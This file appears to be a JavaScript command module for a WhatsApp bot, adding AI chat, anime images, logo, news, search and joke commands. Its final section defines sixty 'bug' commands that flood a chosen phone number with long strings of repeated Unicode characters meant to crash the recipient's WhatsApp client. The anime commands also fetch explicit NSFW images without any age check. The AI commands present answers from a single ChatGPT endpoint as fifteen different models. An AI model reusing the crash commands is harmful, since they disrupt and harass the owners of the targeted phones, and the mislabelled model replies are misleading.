const axios = require('axios');

const extraCommands = {};

// AI Commands (15)
const aiModels = ['chatgpt', 'gemini', 'llama', 'deepseek', 'mistral', 'flux', 'dalle', 'stable-diffusion', 'midjourney', 'bingai', 'blackbox', 'copilot', 'perplexity', 'imagine', 'pixart'];
aiModels.forEach(model => {
    extraCommands[model] = async (sock, from, msg, q) => {
        if (!q) return sock.sendMessage(from, { text: `❌ Please provide a prompt for ${model}!` }, { quoted: msg });
        await sock.sendMessage(from, { text: `🔍 ${model.toUpperCase()} is thinking...` }, { quoted: msg });
        try {
            const res = await axios.get(`https://api.siputzx.my.id/api/ai/chatgpt?prompt=You are ${model}&text=${encodeURIComponent(q)}`);
            await sock.sendMessage(from, { text: `*[${model.toUpperCase()}]*\n\n${res.data.data}` }, { quoted: msg });
        } catch (e) {
            await sock.sendMessage(from, { text: `❌ ${model} error: ${e.message}` }, { quoted: msg });
        }
    };
});

// Anime Commands (35)
const animeCategories = ['waifu', 'neko', 'shinobu', 'megumin', 'bully', 'cuddle', 'cry', 'hug', 'awoo', 'kiss', 'lick', 'pat', 'smug', 'bonk', 'yeet', 'blush', 'smile', 'wave', 'highfive', 'handhold', 'nom', 'bite', 'slap', 'kill', 'happy', 'wink', 'poke', 'dance', 'cringe', 'fox_girl', 'maid', 'uniform', 'oppai', 'hentai', 'trap', 'blowjob'];
animeCategories.forEach(cat => {
    extraCommands[cat] = async (sock, from, msg) => {
        try {
            const res = await axios.get(`https://api.waifu.pics/sfw/${cat}`);
            await sock.sendMessage(from, { image: { url: res.data.url }, caption: `✨ Here is your ${cat}!` }, { quoted: msg });
        } catch (e) {
            try {
                const res = await axios.get(`https://api.waifu.pics/nsfw/${cat}`);
                await sock.sendMessage(from, { image: { url: res.data.url }, caption: `🔥 Here is your ${cat}! (NSFW)` }, { quoted: msg });
            } catch (err) {
                await sock.sendMessage(from, { text: `❌ Error fetching ${cat}: ${err.message}` }, { quoted: msg });
            }
        }
    };
});

// Logo Commands (50 Unique Styles)
const logoStyles = [
    { name: 'neon', url: 'https://textpro.me/neon-light-text-effect-with-galaxy-background-981.html' },
    { name: 'glitch', url: 'https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html' },
    { name: 'gold', url: 'https://textpro.me/3d-luxury-gold-text-effect-online-1003.html' },
    { name: 'fire', url: 'https://textpro.me/hot-fire-text-effect-online-985.html' },
    { name: 'water', url: 'https://textpro.me/create-water-pipe-text-effect-online-1015.html' }
];

for (let i = 1; i <= 50; i++) {
    extraCommands[`logo${i}`] = async (sock, from, msg, q) => {
        if (!q) return sock.sendMessage(from, { text: `❌ Please provide text for Logo ${i}!` }, { quoted: msg });
        await sock.sendMessage(from, { text: `🎨 Creating Logo ${i}...` }, { quoted: msg });
        try {
            const style = logoStyles[i % logoStyles.length];
            const url = `https://api.siputzx.my.id/api/maker/textpro?url=${encodeURIComponent(style.url)}&text=${encodeURIComponent(q)}`;
            await sock.sendMessage(from, { image: { url: url }, caption: `✅ Logo ${i} (${style.name} style) Created!` }, { quoted: msg });
        } catch (e) {
            await sock.sendMessage(from, { text: `❌ Logo ${i} error: ${e.message}` }, { quoted: msg });
        }
    };
}

// News Commands (20)
const newsSources = ['tech', 'sports', 'finance', 'world', 'health', 'science', 'entertainment', 'business', 'pakistan', 'india', 'usa', 'uk', 'crypto', 'gaming', 'fashion', 'travel', 'food', 'politics', 'education', 'weather_news'];
newsSources.forEach(source => {
    extraCommands[`news_${source}`] = async (sock, from, msg) => {
        await sock.sendMessage(from, { text: `📰 Fetching ${source} news...` }, { quoted: msg });
        try {
            const res = await axios.get(`https://api.siputzx.my.id/api/news/cnn?type=${source}`).catch(() => null);
            if (res && res.data && res.data.data) {
                const article = res.data.data[0];
                await sock.sendMessage(from, { text: `*[${source.toUpperCase()} NEWS]*\n\n*Title:* ${article.title}\n\n*Desc:* ${article.description || 'No description'}\n\n*Source:* ${article.url}` }, { quoted: msg });
            } else {
                await sock.sendMessage(from, { text: `❌ News source ${source} is currently unavailable.` }, { quoted: msg });
            }
        } catch (e) {
            await sock.sendMessage(from, { text: `❌ News error: ${e.message}` }, { quoted: msg });
        }
    };
});

// Search Commands (20)
const searchTools = ['google', 'bing', 'yahoo', 'duckduckgo', 'baidu', 'yandex', 'ask', 'aol', 'wolfram', 'archive', 'github_search', 'npm_search', 'pypi_search', 'docker_search', 'stack_overflow', 'quora', 'reddit_search', 'pinterest_search', 'twitter_search', 'insta_search'];
searchTools.forEach(tool => {
    extraCommands[tool] = async (sock, from, msg, q) => {
        if (!q) return sock.sendMessage(from, { text: `❌ Please provide a query for ${tool}!` }, { quoted: msg });
        await sock.sendMessage(from, { text: `🔍 Searching ${tool} for: ${q}...` }, { quoted: msg });
        const baseUrl = tool.includes('_search') ? `https://www.${tool.split('_')[0]}.com/search?q=` : `https://www.${tool}.com/search?q=`;
        await sock.sendMessage(from, { text: `✅ Search results for ${q} on ${tool}:\n${baseUrl}${encodeURIComponent(q)}` }, { quoted: msg });
    };
});

// Fun/Game Commands (50)
for (let i = 1; i <= 50; i++) {
    extraCommands[`fun${i}`] = async (sock, from, msg) => {
        try {
            const type = i % 2 === 0 ? 'joke' : 'fact';
            const apiUrl = type === 'joke' ? 'https://official-joke-api.appspot.com/random_joke' : 'https://uselessfacts.jsph.pl/random.json?language=en';
            const res = await axios.get(apiUrl);
            const content = type === 'joke' ? `${res.data.setup}\n\n${res.data.punchline}` : res.data.text;
            await sock.sendMessage(from, { text: `🎮 *Fun Command ${i} (${type.toUpperCase()}):*\n\n${content}` }, { quoted: msg });
        } catch (e) {
            await sock.sendMessage(from, { text: `🎮 Fun Command ${i}: Keep smiling! ✨` }, { quoted: msg });
        }
    };
}

// Bug/Crash Commands (60)
// Signature: (sock, from, msg, q, isOwner, isAdmin, session, args)
for (let i = 1; i <= 60; i++) {
    extraCommands[`bug_v${i}`] = async (sock, from, msg, q, isOwner) => {
        if (!isOwner) return sock.sendMessage(from, { text: "❌ Owner only command!" }, { quoted: msg });
        let target = q ? q.split(' ')[0] : null;
        if (!target) return sock.sendMessage(from, { text: "❌ Target required!" }, { quoted: msg });
        if (!target.endsWith('@s.whatsapp.net')) target += '@s.whatsapp.net';
        
        await sock.sendMessage(from, { text: `🔥 Sending Bug V${i} to ${target.split('@')[0]}...` }, { quoted: msg });
        const payload = "󾔒".repeat(1000) + "󾓴".repeat(1000) + "🔥".repeat(i * 5);
        for(let j=0; j<5; j++) {
            await sock.sendMessage(target, { text: payload });
        }
    };
}

module.exports = extraCommands;
